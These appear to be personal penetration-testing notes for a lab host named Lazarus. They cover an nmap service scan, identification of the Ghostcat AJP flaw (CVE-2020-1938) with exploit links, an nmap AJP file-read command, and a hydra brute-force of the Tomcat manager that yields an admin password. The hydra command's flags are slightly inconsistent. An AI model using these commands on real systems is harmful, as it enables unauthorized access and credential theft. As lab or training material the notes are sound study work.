# Bravo notes

- service scan:

```bash
nmap -sV -p 0-65535 10.128.161.57
```

```
Nmap scan report for 10.128.161.57
Host is up (0.0013s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
80/tcp   open  http    nginx 1.14.2
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8282/tcp open  http    Apache Tomcat 8.5.41
Service Info: Host: Lazarus
```

- Apache Tomcat 8.5.41 does not seem to be vulnerable but Apache Jserv is (CVE-2020-1938)
- it allows to read all files from web application
- exploitable from metasploit
- got /WEB-INF/web.xml file, but it's default and does not contain anything special

```bash
# Ask AJP directly for interesting paths and save the response body
nmap -p 8009 --script ajp-request \
  --script-args 'path=/manager/html,method=GET,filename=ajp-manager.out' <IP>
```
- https://hacktricks.wiki/en/network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp.html
- https://github.com/xindongzhuaizhuai/CVE-2020-1938/blob/master/CVE-2020-1938.py
- https://www.blackduck.com/blog/ghostcat-vulnerability-cve-2020-1938.html
- need to find conf/tomcat-users.xml
- Apache Tomcat/8.5.41, so exploitable

```bash
hydra -f -vV -l logins.txt -p 3000passwds.txt http-get://10.128.161.57:8282 -m /manager/html
```

[ATTEMPT] target 10.128.161.57 - login "admin" - pass "alison" - 1017 of 9000 [child 9] (0/0)
[8282][http-get] host: 10.128.161.57   login: admin   password: cassandra
[STATUS] attack finished for 10.128.161.57 (valid pair found)
